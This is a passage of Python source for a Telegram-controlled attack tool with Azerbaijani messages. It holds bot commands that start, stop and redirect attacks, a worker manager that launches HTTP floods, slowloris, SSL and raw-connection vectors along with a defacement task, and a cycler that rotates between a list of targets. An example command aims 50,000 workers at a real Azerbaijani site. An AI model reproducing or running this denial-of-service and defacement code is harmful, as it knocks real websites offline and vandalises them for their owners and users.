                                        f"{'🔥 HÜCUM EDİR' if running else '💤 GÖZLƏYİR'}\n"
                                        f"🎯 <code>{current_target}</code>\n"
                                        f"⏱ Keçən: {int(elapsed)}s\n"
                                        f"✅ Uğurlu: {total_ok:,}\n"
                                        f"❌ Uğursuz: {total_fail:,}\n"
                                        f"📈 Sürət: {rate:.0f}/s\n"
                                        f"🎯 Vuln: {stats['vuln_found']}\n"
                                        f"⚔️ Deface: {stats['deface_ok']}")
                            
                            elif cmd.startswith("/attack"):
                                parts = cmd.split()
                                if len(parts) >= 4:
                                    current_target = parts[1]
                                    WORKERS = int(parts[2])
                                    DURATION = int(parts[3])
                                    TARGET_URL = f"https://{current_target}:{PORT}/"
                                    
                                    for k in stats:
                                        stats[k] = 0
                                    
                                    running = True
                                    send_tg(f"🔥 <b>HÜCUM BAŞLADI!</b>\n"
                                            f"🎯 <code>{current_target}</code>\n"
                                            f"⚙️ {WORKERS} worker\n"
                                            f"⏱ {DURATION}s\n"
                                            f"⚔️ Deface: {'Aktiv' if DEFACE_ENABLED else 'Deaktiv'}")
                                else:
                                    send_tg("❌ /attack HEDEF WORKERS DURATION\nMəsələn: /attack lalafo.az 50000 600")
                            
                            elif cmd == "/stop":
                                running = False
                                send_tg("⛔ <b>Hücum dayandırıldı</b>")
                            
                            elif cmd == "/random":
                                new_target = random.choice([t for t in TARGETS if t != current_target])
                                current_target = new_target
                                TARGET_URL = f"https://{current_target}:{PORT}/"
                                send_tg(f"🎲 Random hədəf: <code>{current_target}</code>")
                            
                            elif cmd == "/list":
                                targets_list = "\n".join([f"• <code>{t}</code>" for t in TARGETS[:30]])
                                send_tg(f"📋 <b>Hədəf siyahısı ({len(TARGETS)}):</b>\n{targets_list}")
                            
                            elif cmd.startswith("/multitarget"):
                                running = True
                                send_tg(f"🔥 <b>MULTI-TARGET HÜCUM!</b>\n{len(TARGETS)} hədəfə hücum başladı!")
                                # This will cycle through targets
                            
                            elif cmd.startswith("/set"):
                                parts = cmd.split()
                                if len(parts) >= 3:
                                    WORKERS = int(parts[1])
                                    DURATION = int(parts[2])
                                    send_tg(f"✅ Konfiq: {WORKERS} workers | {DURATION}s")
                            
                            elif cmd.startswith("/deface"):
                                parts = cmd.split()
                                if len(parts) >= 2:
                                    DEFACE_ENABLED = parts[1] == "on"
                                    send_tg(f"⚔️ Deface: {'Aktiv' if DEFACE_ENABLED else 'Deaktiv'}")
        except:
            pass
        
        await asyncio.sleep(1)

# =============================================
# STATS PRINTER + HEARTBEAT
# =============================================
async def stats_printer():
    global start_time
    prev = {k: 0 for k in stats}
    last_report = time.time()
    
    while True:
        await asyncio.sleep(5)
        elapsed = time.time() - start_time if start_time else 0
        
        total_ok = sum(v for k, v in stats.items() if k.endswith("_ok"))
        total_fail = sum(v for k, v in stats.items() if k.endswith("_fail"))
        rate = total_ok / elapsed if elapsed > 0 else 0
        
        diffs = {}
        for k in stats:
            diffs[k] = stats[k] - prev[k]
        
        # Console output
        print(f"\r[⏱ {int(elapsed)}s] 🎯{current_target[:20]:<20} ✅{total_ok:,} ❌{total_fail:,} 📈{rate:.0f}/s "
              f"HTTP:{diffs.get('http_ok',0)} BST:{diffs.get('burst_ok',0)} ORG:{diffs.get('origin_ok',0)} "
              f"SSL:{diffs.get('ssl_ok',0)} API:{diffs.get('api_ok',0)} PST:{diffs.get('post_ok',0)} "
              f"HDR:{diffs.get('header_ok',0)} RAW:{diffs.get('raw_ok',0)} "
              f"⚔️:{diffs.get('deface_ok',0)} 🎯:{diffs.get('vuln_found',0)}" + " "*20, end="")
        
        # Telegram report every 30s
        if time.time() - last_report > 30:
            send_tg(f"📊 <b>{int(elapsed)}s Report</b>\n"
                    f"🎯 <code>{current_target}</code>\n"
                    f"✅ {total_ok:,} ❌ {total_fail:,} 📈 {rate:.0f}/s\n"
                    f"🎯 Zəiflik: {stats['vuln_found']} | ⚔️ Deface: {stats['deface_ok']}")
            last_report = time.time()
        
        for k in stats:
            prev[k] = stats[k]

# =============================================
# WORKER MANAGER
# =============================================
async def worker_manager():
    global running, start_time, current_target, TARGET_URL
    
    connector = aiohttp.TCPConnector(
        limit=0, force_close=True, ttl_dns_cache=0,
        ssl=False, use_dns_cache=False, enable_cleanup_closed=True,
        limit_per_host=0,
    )
    timeout = aiohttp.ClientTimeout(total=0)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        methods = [
            (v1_http, 20),
            (v2_burst, 12),
            (v3_origin, 12),
            (v4_ssl, 10),
            (v5_slow, 8),
            (v6_api, 10),
            (v7_slowloris, 8),
            (v8_post, 6),
            (v9_header, 8),
            (v10_raw, 6),
        ]
        
        total_w = sum(w for _, w in methods)
        tasks = []
        
        for i in range(WORKERS):
            r = random.randint(1, total_w)
            cum = 0
            chosen = v1_http
            for func, w in methods:
                cum += w
                if r <= cum:
                    chosen = func
                    break
            
            if chosen in (v3_origin, v4_ssl, v5_slow, v7_slowloris, v10_raw):
                tasks.append(asyncio.create_task(chosen()))
            else:
                tasks.append(asyncio.create_task(chosen(session)))
        
        # Start deface vector
        if DEFACE_ENABLED:
            tasks.append(asyncio.create_task(v11_deface(session)))
        
        start_time = time.time()
        send_tg(f"🚀 {len(tasks)} worker işə salındı!\n🎯 <code>{current_target}</code>")
        print(f"\n[{int(time.time())}] Launched {len(tasks)} tasks\n")
        
        await asyncio.sleep(DURATION)
        
        running = False
        for t in tasks:
            t.cancel()
        
        total_ok = sum(v for k, v in stats.items() if k.endswith("_ok"))
        total_fail = sum(v for k, v in stats.items() if k.endswith("_fail"))
        send_tg(f"🏁 <b>HÜCUM BİTDİ!</b>\n"
                f"🎯 <code>{current_target}</code>\n"
                f"✅ {total_ok:,} sorğu\n"
                f"❌ {total_fail:,} uğursuz\n"
                f"🎯 Zəiflik: {stats['vuln_found']}\n"
                f"⚔️ Deface: {stats['deface_ok']}")
        print(f"\n[DONE] Attack complete. Total OK: {total_ok:,}")

# =============================================
# MULTI-TARGET CYCLER
# =============================================
async def multi_target_cycle():
    global current_target, TARGET_URL, running
    
    while True:
        if running and current_target in TARGETS:
            # Switch target every 60 seconds
            await asyncio.sleep(60)
            if running:
                old = current_target
                remaining = [t for t in TARGETS if t != current_target]
                if remaining:
                    current_target = random.choice(remaining)
                    TARGET_URL = f"https://{current_target}:{PORT}/"
                    send_tg(f"🔄 Hədəf dəyişdirildi!\n❌ <code>{old}</code>\n🎯 <code>{current_target}</code>")
        else:
            await asyncio.sleep(10)

#
